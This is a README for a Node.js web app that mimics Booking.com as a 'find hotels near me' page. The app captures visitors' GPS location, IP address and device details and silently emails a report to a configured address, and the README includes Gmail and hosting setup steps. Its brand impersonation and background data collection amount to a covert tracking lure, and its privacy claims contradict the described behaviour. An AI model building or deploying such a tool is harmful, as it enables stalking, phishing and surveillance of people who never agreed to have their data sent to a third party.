# 🏨 BookYourStay - Hotel Location Search

A location-based hotel search application that detects user location and provides a Booking.com-style interface to find nearby hotels.

## ✨ Features

- 📍 **GPS Location Detection** - Automatically finds user's location
- 🏨 **Hotel Search Interface** - Booking.com-style professional UI
- 📧 **Email Notifications** - Sends detailed user reports via email
- 🌍 **Reverse Geocoding** - Converts coordinates to city names
- 📱 **Mobile Responsive** - Works on all devices
- 🔒 **Device Analytics** - Comprehensive user data collection

## 🚀 Quick Start

### Local Development

```bash
# Install dependencies
npm install

# Create .env file with your email configuration
EMAIL_USER=your-email@gmail.com
EMAIL_PASS=your-app-password
TARGET_EMAIL=destination@email.com
PORT=4000

# Start the server
npm start
```

Visit `http://localhost:4000`

### Environment Variables

```env
EMAIL_USER=your-gmail@gmail.com
EMAIL_PASS=your-16-char-app-password
TARGET_EMAIL=where-to-send@email.com
PORT=4000
```

## 📧 Email Setup (Gmail)

1. Enable 2-Step Verification in Gmail
2. Generate App Password: https://myaccount.google.com/apppasswords
3. Use the 16-character password in `EMAIL_PASS`

## 🌐 Deployment

### Vercel (Recommended)
1. Push to GitHub
2. Connect to Vercel
3. Add environment variables
4. Deploy automatically

### Render
1. Connect GitHub repo
2. Build: `npm install`
3. Start: `npm start`
4. Add environment variables

## 🔧 API Endpoints

- `GET /` - Main application
- `POST /save-location` - Save user location and get hotels
- `GET /test-email` - Test email configuration
- `GET /test-ip` - Test IP detection

## 📊 Data Collected

- GPS coordinates and city name
- Device type (Mobile/Desktop/Tablet)
- Operating system and browser
- IP address and network info
- Screen resolution and capabilities
- Timestamp with timezone

## 🎯 How It Works

1. User clicks "Find Hotels Near Me"
2. Browser requests location permission
3. GPS coordinates are captured
4. Server performs reverse geocoding
5. Booking.com-style interface displays
6. Clicking hotels redirects to actual Booking.com
7. User data is emailed in background

## 🛠️ Technologies

- **Backend**: Node.js, Express
- **Email**: Nodemailer
- **Geocoding**: OpenStreetMap Nominatim
- **Styling**: Pure CSS (Booking.com inspired)
- **IP Detection**: Multiple fallback methods

## 📱 Browser Support

- Chrome/Safari/Firefox (Desktop & Mobile)
- Requires geolocation permission
- Works on HTTP (localhost) and HTTPS (production)

## 🔒 Privacy

- Location data is processed securely
- Email notifications are optional
- No permanent data storage
- Users can deny location access

## 📞 Support

For issues or questions, check the console logs or test endpoints:
- `/test-email` - Email configuration
- `/test-ip` - IP detection

---

Made with ❤️ for seamless hotel discovery
